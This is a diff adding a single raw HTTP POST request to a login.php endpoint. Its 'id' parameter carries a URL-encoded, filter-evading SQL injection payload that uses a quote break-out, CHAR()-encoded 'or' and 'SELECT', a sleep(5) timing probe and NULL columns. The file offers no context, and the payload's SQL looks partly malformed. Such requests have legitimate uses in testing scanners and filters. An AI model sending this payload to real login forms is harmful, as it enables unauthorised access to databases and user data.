@@ -1,0 +1,9 @@
+POST /login.php HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 107
+
+id=%27%20CHAR%28111%2C114%29%20sleep%285%29--%253b%20CHAR%2883%2C69%2C76%2C69%2C67%2C84%29%20NULL%2C%20NULL
